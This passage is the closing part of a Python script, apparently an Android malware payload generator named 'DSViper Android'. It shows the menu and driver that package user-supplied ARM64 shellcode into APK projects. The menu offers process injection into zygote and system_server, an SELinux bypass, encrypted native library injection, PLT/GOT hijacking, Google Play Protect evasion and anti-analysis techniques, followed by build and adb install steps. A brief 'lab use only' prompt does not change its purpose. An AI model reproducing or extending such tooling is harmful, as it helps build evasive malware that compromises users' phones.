        self.create_indirect_syscall_java_code(project_dir)
        self.create_android_manifest(project_dir)
        self.create_cmake_build(project_dir)
        self.create_build_script(project_dir)

        print(f"{Colors.GREEN}[+] {description} payload generated successfully!{Colors.END}")
        return True

def main():
    """Main execution function - matches DSViper.py style"""
    print_banner()

    # Ask for user consent (similar to original DSViper.py)
    consent = input(f"{Colors.WHITE}{Colors.BOLD}You sure you want to Continue? (Use it ethically, and in lab environments only) y/n: {Colors.END}")
    if consent.lower() not in ['y', 'yes']:
        print(f"{Colors.YELLOW}[!] Exiting...{Colors.END}")
        sys.exit(0)

    # Initialize payload generator
    generator = AndroidPayloadGenerator()

    # Display menu and get user choice
    generator.display_menu()

    while True:
        try:
            choice = input(f"{Colors.WHITE}{Colors.BOLD}Enter your payload choice: {Colors.END}").strip()

            if choice == "0":
                print(f"{Colors.YELLOW}[!] Exiting...{Colors.END}")
                sys.exit(0)

            # Get payload file from user (similar to original DSViper.py)
            print(f"\n{Colors.CYAN}[*] ARM64 Shellcode Selection{Colors.END}")
            print(f"{Colors.YELLOW}[!] Supported formats: .bin, .raw, .shellcode, .payload{Colors.END}")
            print(f"{Colors.YELLOW}[!] Architecture: ARM64 (AArch64) only{Colors.END}")
            print(f"{Colors.CYAN}[*] Place payloads in '{generator.input_payloads_dir}' directory for automatic detection{Colors.END}")

            if not generator.get_payload_input():
                continue

            # Execute selected technique
            success = False

            if choice == "1":
                print(f"{Colors.CYAN}[*] Selected: ARM64 Direct Syscall Injection{Colors.END}")
                success = generator.arm64_direct_syscall()
            elif choice == "2":
                print(f"{Colors.CYAN}[*] Selected: Zygote Process Injection{Colors.END}")
                success = generator.zygote_injection()
            elif choice == "3":
                print(f"{Colors.CYAN}[*] Selected: System Server Injection{Colors.END}")
                success = generator.system_server_injection()
            elif choice == "4":
                print(f"{Colors.CYAN}[*] Selected: ART Runtime Manipulation{Colors.END}")
                success = generator.art_runtime_manipulation()
            elif choice == "5":
                print(f"{Colors.CYAN}[*] Selected: SELinux Policy Bypass{Colors.END}")
                success = generator.selinux_bypass()
            elif choice == "6":
                print(f"{Colors.CYAN}[*] Selected: Native Library Injection (XOR){Colors.END}")
                success = generator.native_injection_xor()
            elif choice == "7":
                print(f"{Colors.CYAN}[*] Selected: Native Library Injection (AES){Colors.END}")
                success = generator.native_injection_aes()
            elif choice == "8":
                print(f"{Colors.CYAN}[*] Selected: JNI Method Hooking{Colors.END}")
                success = generator.jni_method_hooking()
            elif choice == "9":
                print(f"{Colors.CYAN}[*] Selected: PLT/GOT Hijacking{Colors.END}")
                success = generator.plt_got_hijacking()
            elif choice == "10":
                print(f"{Colors.CYAN}[*] Selected: Dynamic DEX Loading{Colors.END}")
                success = generator.dynamic_dex_loading()
            elif choice == "11":
                print(f"{Colors.CYAN}[*] Selected: Android Indirect Syscall (DS Viper Adapted){Colors.END}")
                print(f"{Colors.RED}{Colors.BOLD}[!] This is the main DS Viper Technique 11 adaptation{Colors.END}")
                success = generator.android_indirect_syscall()
            elif choice == "12":
                print(f"{Colors.CYAN}[*] Selected: Google Play Protect Evasion{Colors.END}")
                success = generator.play_protect_evasion()
            elif choice == "13":
                print(f"{Colors.CYAN}[*] Selected: Advanced Anti-Analysis Suite{Colors.END}")
                success = generator.advanced_anti_analysis()
            else:
                print(f"{Colors.RED}[!] Invalid option. Please try again.{Colors.END}")
                continue

            if success:
                print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Payload generation completed successfully!{Colors.END}")
                print(f"{Colors.CYAN}[*] Check the output directory for your Android project{Colors.END}")
                print(f"{Colors.YELLOW}[*] Build instructions:{Colors.END}")
                print(f"    1. Navigate to the generated project directory")
                print(f"    2. Run: chmod +x build.sh && ./build.sh")
                print(f"    3. Install APK: adb install <generated_apk>")
                print(f"    4. Monitor with: adb logcat | grep DSViper")
            else:
                print(f"\n{Colors.RED}[!] Payload generation failed!{Colors.END}")

            # Ask if user wants to generate another payload
            another = input(f"\n{Colors.CYAN}Generate another payload? (y/n): {Colors.END}").strip().lower()
            if another not in ['y', 'yes']:
                break

            # Show menu again
            generator.display_menu()

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Interrupted by user. Exiting...{Colors.END}")
            break
        except Exception as e:
            print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
            continue

    print(f"\n{Colors.GREEN}[+] Thank you for using DSViper Android!{Colors.END}")
    print(f"{Colors.YELLOW}[!] Remember: Use only in authorized testing environments{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user. Exiting...{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {e}{Colors.END}")
        sys.exit(1)
